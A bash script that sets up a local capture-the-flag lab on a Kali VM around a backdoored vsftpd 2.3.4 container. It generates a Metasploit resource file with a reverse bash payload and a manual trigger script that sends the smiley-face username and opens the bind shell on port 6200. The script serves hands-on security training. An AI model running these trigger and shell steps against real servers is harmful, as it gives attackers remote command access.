#!/usr/bin/env bash
set -Eeuo pipefail

PORTS=(2222 5678 6200 6379 8080)
INITIAL_PORTS=(2222 5678 6379 8080)

if [[ ${EUID} -ne 0 ]]; then
  echo "Run as root: sudo bash start-kali.sh" >&2
  exit 1
fi

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCRIPT_DIR}"

if ! ip link show eth0 >/dev/null 2>&1; then
  echo "This Kali VM has no eth0 interface." >&2
  ip -brief link >&2
  exit 1
fi

TARGET_IP="$(ip -4 -o addr show dev eth0 scope global | awk '{split($4, address, "/"); print address[1]; exit}')"
if [[ -z ${TARGET_IP} ]]; then
  echo "eth0 has no IPv4 address. Connect the VM network and retry." >&2
  exit 1
fi

if docker compose version >/dev/null 2>&1; then
  COMPOSE=(docker compose)
elif docker-compose version >/dev/null 2>&1; then
  COMPOSE=(docker-compose)
else
  echo "Docker Compose is not installed. Run: sudo bash bootstrap-kali.sh" >&2
  exit 1
fi

printf '\nStopping the old CTF and anything using the required ports...\n'
"${COMPOSE[@]}" down --remove-orphans >/dev/null 2>&1 || true
docker rm -f vsftpd-234-ctf >/dev/null 2>&1 || true

for port in "${PORTS[@]}"; do
  mapfile -t containers < <(docker ps -q --filter "publish=${port}")
  if [[ ${#containers[@]} -gt 0 ]]; then
    docker rm -f "${containers[@]}" >/dev/null
  fi
  fuser -k "${port}/tcp" >/dev/null 2>&1 || true
done

cat > .env <<EOF
LAB_BIND_IP=0.0.0.0
PHP_CALLBACK_IP=${TARGET_IP}
EOF

printf '\nBuilding and starting the CTF on eth0 (%s)...\n' "${TARGET_IP}"
"${COMPOSE[@]}" up -d --build --force-recreate

for attempt in $(seq 1 90); do
  state="$(docker inspect --format '{{if .State.Health}}{{.State.Health.Status}}{{else}}starting{{end}}' vsftpd-234-ctf 2>/dev/null || true)"
  if [[ ${state} == healthy ]]; then
    break
  fi
  if [[ ${attempt} -eq 90 ]]; then
    "${COMPOSE[@]}" ps
    "${COMPOSE[@]}" logs --tail 100
    echo "The CTF target did not become healthy." >&2
    exit 1
  fi
  sleep 2
done

for port in "${INITIAL_PORTS[@]}"; do
  if ! nc -z -w 2 "${TARGET_IP}" "${port}"; then
    echo "Required port ${port}/tcp is not reachable on ${TARGET_IP}." >&2
    exit 1
  fi
done

CALLING_USER="${SUDO_USER:-root}"
CALLING_HOME="$(getent passwd "${CALLING_USER}" | cut -d: -f6)"
if [[ -z ${CALLING_HOME} || ! -d ${CALLING_HOME} ]]; then
  echo "Could not determine the home directory for ${CALLING_USER}." >&2
  exit 1
fi

cat > "${CALLING_HOME}/exploit.rc" <<EOF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS ${TARGET_IP}
set RPORT 5678
set PAYLOAD cmd/unix/reverse_bash
set LHOST ${TARGET_IP}
set LPORT 4444
set AutoCheck false
run
EOF

cat > "${CALLING_HOME}/run-ftp-exploit.sh" <<EOF
#!/usr/bin/env bash
set -Eeuo pipefail
sudo docker restart vsftpd-234-ctf >/dev/null
sleep 3
exec msfconsole -q -r "\${HOME}/exploit.rc"
EOF

cat > "${CALLING_HOME}/open-ftp-shell.sh" <<EOF
#!/usr/bin/env bash
set -Eeuo pipefail
sudo docker restart vsftpd-234-ctf >/dev/null
sleep 3
printf 'USER student:)\r\nPASS test\r\n' | nc -w 2 ${TARGET_IP} 5678 >/dev/null || true
sleep 1
exec nc -nv ${TARGET_IP} 6200
EOF

chown "${CALLING_USER}:" \
  "${CALLING_HOME}/exploit.rc" \
  "${CALLING_HOME}/run-ftp-exploit.sh" \
  "${CALLING_HOME}/open-ftp-shell.sh"
chmod 0644 "${CALLING_HOME}/exploit.rc"
chmod 0755 "${CALLING_HOME}/run-ftp-exploit.sh" "${CALLING_HOME}/open-ftp-shell.sh"

if [[ -n ${SUDO_USER:-} && ${SUDO_USER} != root ]]; then
  usermod -aG docker "${SUDO_USER}" || true
fi

"${COMPOSE[@]}" ps
cat <<EOF

CTF ready. The Git repository remains at:
  ${SCRIPT_DIR}

Attack target:
  ${TARGET_IP} (eth0)

Use a TCP connect scan when scanning Docker ports on the same Kali VM:
  sudo nmap -Pn -sT -sV -p2222,5678,6200,6379,8080 ${TARGET_IP}

Fresh Metasploit path:
  ~/run-ftp-exploit.sh

Direct bind-shell fallback:
  ~/open-ftp-shell.sh

TCP 6200 is expected to be closed until the FTP backdoor is triggered.
EOF
